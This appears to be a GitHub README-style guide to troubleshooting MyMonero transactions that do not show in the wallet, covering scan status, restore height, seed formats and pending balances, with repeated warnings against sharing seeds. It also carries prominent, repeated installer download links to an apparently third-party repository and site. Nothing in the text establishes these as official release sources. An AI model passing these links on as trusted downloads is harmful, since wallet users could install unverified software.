<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Transaction Not Showing</h1>
<p align="center">Troubleshoot missing incoming or outgoing activity without exposing wallet secrets.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A transaction may not appear until the wallet has scanned recent activity, or because you are viewing a different wallet. Check the address, scan status, and transaction details before retrying a payment.


The MyMonero.info site covers this in its [MyMonero transaction not showing guide](https://mymonero.info/mymonero-transaction-not-showing). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [the MyMonero FAQ](https://mymonero.info/faq) if anything feels off.

## You'll see this if
- Someone says they sent XMR but your wallet history has no entry.
- A send completed but you cannot find it in the activity list.
- You restored a wallet and older transactions are absent.
- The balance appears stale or differs from the amount you expected.

## Why it happens
MyMonero must scan wallet activity to display transactions. A slow or interrupted scan can leave history out of date. Restore height is the block height from which a restored wallet begins scanning; choosing a later height than the transaction can exclude older activity. An earlier height is safer when uncertain but takes longer. Also confirm that the sender used the correct receiving address and that you opened the same wallet that supplied it.

An incoming transaction may be recorded but still pending or locked, so its status and spendable amount may not immediately match expectations. A transaction shown in a wallet is also different from an exchange credit: an exchange may apply its own deposit requirements. Read [locked and pending MyMonero balance](./mymonero-locked-pending-balance.md), [spendable balance guidance](./mymonero-spendable-balance-low.md), and [balance shows zero](./mymonero-balance-shows-zero.md).

MyMonero desktop's final release is v1.3.3 for Windows (.exe), macOS (.dmg), and Linux (.zip) on GitHub. It still opens wallets and sends XMR, but is no longer maintained and receives no new features or security updates. MyMonero hosted servers and web wallet login stopped. You can continue using desktop or restore in Cake Wallet (iOS, Android, macOS, Linux); Windows desktop builds are paused at the time of writing. See [MyMonero migration choices](./mymonero-to-cake-wallet-migration.md).

---
## Fix
1. **Identify whether it is incoming or outgoing.** Ask the sender for the relevant non-secret transaction information, or inspect your own wallet record. Never ask anyone to send seed words or private keys. For an exchange transfer, consult that exchange's official deposit status too.
2. **Verify the receiving wallet.** Compare the address the sender used with the wallet you currently have open. Wallet names can be similar and are not proof of identity. If it is not the expected wallet, locate your own seed backup and restore the correct wallet privately.
3. **Check the scan indicator.** Let MyMonero finish scanning and update. Keep the app open and connected as appropriate. If it appears stuck, review [MyMonero not syncing](./mymonero-not-syncing.md). Error 523 is general guidance that the server connection is unavailable; it does not prove the transaction or seed is invalid.
4. **Review restore height.** On a restored wallet, check the starting height. If it is later than the activity you expect, restore or rescan from an earlier suitable height. Earlier scans include more history but take longer. See restore height explained.
5. **Confirm the seed format if restoring.** MyMonero has 13-word legacy, MyMonero-specific seeds and 25-word standard Monero seeds. Use a matching restoration option. Check your own backup for order and spelling; do not paste it into a website. Learn about restoring a MyMonero wallet.
6. **Wait for pending activity to update.** An incoming amount might not yet be spendable. Check the transaction status and wallet balance after scanning. Do not create another payment request or send a second transfer just because the first is not immediately visible.
7. **Check the sender's status.** If the sender's wallet or service provides a transaction status, ask them to confirm it was submitted to the address you gave. Share no secret recovery data. If the transfer was through an exchange, its deposit crediting process is separate from wallet scanning.
8. **Keep records safely.** Retain transaction identifiers privately and compare them with your own history. Avoid publishing identifiers alongside personal information or wallet details.

> [!TIP]
> A receiving address is not a seed. You can confirm the address you gave someone without revealing recovery words or private keys.

---
## If that did not work
If scanning is current, the address matches, and there is still no activity, follow up with the sender or service that initiated the transfer using its official support channel. Do not assume the wallet can reverse a completed transfer. For an exchange deposit, use the exchange account's transaction status and requirements rather than sending again.

If a transaction appears in history but the amount is unavailable, see why MyMonero spendable balance is low. If the whole balance appears missing, use zero balance troubleshooting. A seed restoration may have selected a different wallet or incorrect scan range; never share the seed as a way to verify it.

MyMonero hosted web wallet login has stopped. Be wary of a web page offering to show hidden transactions if you enter your seed. For the desktop app's published project details, consult the MyMonero desktop repository. The old desktop app is no longer maintained. Consider Cake Wallet as the stated alternative, while checking its supported restore flow directly and keeping the seed private.

## Prevention
- Copy the receiving address from the wallet you intend to use and verify it before sharing.
- Keep a private note of which wallet and restore height correspond to your activity.
- Allow scanning to finish after restoring or reopening the app.
- Confirm the sender's submission status and any exchange-specific deposit rules.
- Never share seed words, private keys, or passwords with a sender or support agent.
- Use trusted release information and check file integrity before installing desktop software.

## FAQ
<details><summary>Does a missing transaction mean the sender did not pay?</summary>

Not necessarily. Check the sender's status, receiving address, and your wallet's scan status. A wallet may not yet have updated its history.

</details>

<details><summary>Can restore height hide old activity?</summary>

Yes. A scan that begins too late may omit earlier wallet history. Earlier is safer when uncertain, though it takes longer.

</details>

<details><summary>Why does an exchange not show a deposit that my wallet received?</summary>

Exchange crediting is separate from wallet history and may follow the exchange's own requirements. Use its official deposit status and instructions.

</details>

<details><summary>Should I give support the transaction seed?</summary>

No. Never share your seed or private keys. No legitimate helper needs them to check a transaction status.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Locked or Pending Balance](./mymonero-locked-pending-balance.md) | Understand why total funds and the amount available to send may differ. |
| [MyMonero Spendable Balance Is Low](./mymonero-spendable-balance-low.md) | Find out why the amount available to send can be less than your total wallet balance. |
| [MyMonero Import Fee Explained](./mymonero-import-fee-explained.md) | What the historical wallet import fee meant, and how to approach a prompt today. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
